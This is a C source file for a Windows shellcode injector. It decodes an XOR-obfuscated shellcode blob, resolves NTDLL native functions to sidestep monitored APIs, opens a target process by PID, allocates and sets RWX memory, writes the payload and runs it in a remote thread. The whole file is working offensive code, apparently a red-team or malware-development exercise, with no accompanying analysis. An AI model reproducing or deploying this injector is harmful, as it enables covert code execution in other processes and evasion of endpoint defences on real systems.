#include "NT.h"


int main (int argc, char* argv[]){

    HANDLE hProcess=NULL, hThread=NULL;
    DWORD dwPID=0, dwTID=0;
    PVOID rBuffer=NULL;
    HMODULE hNTDLL=NULL;
    NTSTATUS status=NULL;
    PULONG oldProtect;

    /*----------[SHELL CODE]----------*/    
    unsigned char shellCode[] ="\xb7\x03\xc8\xaf\xbb\xa3\x87\x4b\x4b\x4b\x0a\x1a\x0a\x1b\x19\x03\x7a\x99\x1a\x2e\x03\xc0\x19\x2b\x03\xc0\x19\x53\x03\xc0\x19\x6b\x1d\x03\x44\xfc\x01\x01\x03\xc0\x39\x1b\x06\x7a\x82\x03\x7a\x8b\xe7\x77\x2a\x37\x49\x67\x6b\x0a\x8a\x82\x46\x0a\x4a\x8a\xa9\xa6\x19\x0a\x1a\x03\xc0\x19\x6b\xc0\x09\x77\x03\x4a\x9b\x2d\xca\x33\x53\x40\x49\x44\xce\x39\x4b\x4b\x4b\xc0\xcb\xc3\x4b\x4b\x4b\x03\xce\x8b\x3f\x2c\x03\x4a\x9b\x1b\xc0\x03\x53\x0f\xc0\x0b\x6b\x02\x4a\x9b\xa8\x1d\x03\xb4\x82\x06\x7a\x82\x0a\xc0\x7f\xc3\x03\x4a\x9d\x03\x7a\x8b\x0a\x8a\x82\x46\xe7\x0a\x4a\x8a\x73\xab\x3e\xba\x07\x48\x07\x6f\x43\x0e\x72\x9a\x3e\x93\x13\x0f\xc0\x0b\x6f\x02\x4a\x9b\x2d\x0a\xc0\x47\x03\x0f\xc0\x0b\x57\x02\x4a\x9b\x0a\xc0\x4f\xc3\x0a\x13\x0a\x13\x15\x03\x4a\x9b\x12\x11\x0a\x13\x0a\x12\x0a\x11\x03\xc8\xa7\x6b\x0a\x19\xb4\xab\x13\x0a\x12\x11\x03\xc0\x59\xa2\x00\xb4\xb4\xb4\x16\x02\xf5\x3c\x38\x79\x14\x78\x79\x4b\x4b\x0a\x1d\x02\xc2\xad\x03\xca\xa7\xeb\x4a\x4b\x4b\x02\xc2\xae\x02\xf7\x49\x4b\x4a\xf0\x8b\xe3\x4a\x44\x0a\x1f\x02\xc2\xaf\x07\xc2\xba\x0a\xf1\x07\x3c\x6d\x4c\xb4\x9e\x07\xc2\xa1\x23\x4a\x4a\x4b\x4b\x12\x0a\xf1\x62\xcb\x20\x4b\xb4\x9e\x21\x41\x0a\x15\x1b\x1b\x06\x7a\x82\x06\x7a\x8b\x03\xb4\x8b\x03\xc2\x89\x03\xb4\x8b\x03\xc2\x8a\x0a\xf1\xa1\x44\x94\xab\xb4\x9e\x03\xc2\x8c\x21\x5b\x0a\x13\x07\xc2\xa9\x03\xc2\xb2\x0a\xf1\xd2\xee\x3f\x2a\xb4\x9e\xce\x8b\x3f\x41\x02\xb4\x85\x3e\xae\xa3\xd8\x4b\x4b\x4b\x03\xc8\xa7\x5b\x03\xc2\xa9\x06\x7a\x82\x21\x4f\x0a\x13\x03\xc2\xb2\x0a\xf1\x49\x92\x83\x14\xb4\x9e\xc8\xb3\x4b\x35\x1e\x03\xc8\x8f\x6b\x15\xc2\xbd\x21\x0b\x0a\x12\x23\x4b\x5b\x4b\x4b\x0a\x13\x03\xc2\xb9\x03\x7a\x82\x0a\xf1\x13\xef\x18\xae\xb4\x9e\x03\xc2\x88\x02\xc2\x8c\x06\x7a\x82\x02\xc2\xbb\x03\xc2\x91\x03\xc2\xb2\x0a\xf1\x49\x92\x83\x14\xb4\x9e\xc8\xb3\x4b\x36\x63\x13\x0a\x1c\x12\x23\x4b\x0b\x4b\x4b\x0a\x13\x21\x4b\x11\x0a\xf1\x40\x64\x44\x7b\xb4\x9e\x1c\x12\x0a\xf1\x3e\x25\x06\x2a\xb4\x9e\x02\xb4\x85\xa2\x77\xb4\xb4\xb4\x03\x4a\x88\x03\x62\x8d\x03\xce\xbd\x3e\xff\x0a\xb4\xac\x13\x21\x4b\x12\x02\x8c\x89\xbb\xfe\xe9\x1d\xb4\x9e\x4b";
    char key = 'K';
    for (int i=0; i<sizeof(shellCode) - 2; i++){
    shellCode[i] = shellCode[i]^key;
    }

    size_t            bytesWritten = 0;
    size_t shellCodeSize= sizeof(shellCode);

    /*----------[PID]----------*/
    if(argc<2){
        warn("correct usage: %s <PID>", argv[0]);
        return EXIT_FAILURE;
    } 

    dwPID=atoi(argv[1]);

    /*----------[DATA STRUCTS]----------*/
    CLIENT_ID ID ={(HANDLE)dwPID, NULL};
    OBJECT_ATTRIBUTES OA ={sizeof(OA), NULL};


    hNTDLL= GetModuleHandleW(L"NTDLL");

    if (hNTDLL == NULL) {
        warn("unable to get a handle to NTDLL, error: 0x%lx", GetLastError());
        return EXIT_FAILURE;
    }

    /*----------[FUNCTIONS DECLARATION]----------*/
    NtOpenProcess NTOpenProc=(NtOpenProcess)GetProcAddress(hNTDLL,"NtOpenProcess");
    NtAllocateVirtualMemory NTVirtualAllocate=(NtAllocateVirtualMemory)GetProcAddress(hNTDLL,"NtAllocateVirtualMemory");
    NtWriteVirtualMemory NTWriteProcMem=(NtWriteVirtualMemory)GetProcAddress(hNTDLL,"NtWriteVirtualMemory");
    NtCreateThreadEx NTCreateTh=(NtCreateThreadEx)GetProcAddress(hNTDLL,"NtCreateThreadEx");
    NtProtectVirtualMemory NTProtect=(NtProtectVirtualMemory)GetProcAddress(hNTDLL,"NtProtectVirtualMemory");

    /*----------[OPEN PROCESS]----------*/
    status=NTOpenProc(&hProcess,PROCESS_ALL_ACCESS,&OA,&ID);
    if(status!=STATUS_SUCCESS){
        warn("could not open process, error: 0x%x\n",status);
        return EXIT_FAILURE;
    }
    info("Got handle on process: -0x%p\n",hProcess);
    
    /*----------[ALLOCATE MEMORY]----------*/
    status = NTVirtualAllocate(hProcess, &rBuffer, NULL, &shellCodeSize, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
    if(status!=STATUS_SUCCESS){
        warn("could not allocate memory, error: 0x%x\n",status);
        return EXIT_FAILURE;
    }
    info("Allocated %zd-bytes to the process memory\n",shellCodeSize);
    
    /*----------[CHANGE MEMORY PERMISSION]----------*/
    status = NTProtect(hProcess,&rBuffer,&shellCodeSize,PAGE_EXECUTE_READWRITE,&oldProtect);
    if(status!=STATUS_SUCCESS){
        warn("could not change permissions, error: 0x%x\n",status);
        return EXIT_FAILURE;
    }
    info("Changed memory permissions\n",shellCodeSize);
    
    /*----------[WRITE MEMORY]----------*/
    status=NTWriteProcMem(hProcess,rBuffer,shellCode,sizeof(shellCode),&bytesWritten);
    if(status!=STATUS_SUCCESS){
        warn("could not write memory, error: 0x%x\n",status);
        return EXIT_FAILURE;
    }
    info("Written shellcode to the allocated process memory\n");

    /*----------[CREATE THREAD]----------*/
    status=NTCreateTh(&hThread,THREAD_ALL_ACCESS,&OA,hProcess,(PTHREAD_START_ROUTINE)rBuffer,NULL, 0, 0, 0, 0, NULL);
    if(status!=STATUS_SUCCESS){
        warn("could not execute thread, error: 0x%x\n",status);
        return EXIT_FAILURE;
    }
    info("Code executed\n");


    WaitForSingleObject(hThread, INFINITE);

    CloseHandle(hThread);
    CloseHandle(hProcess);

    return EXIT_SUCCESS;


}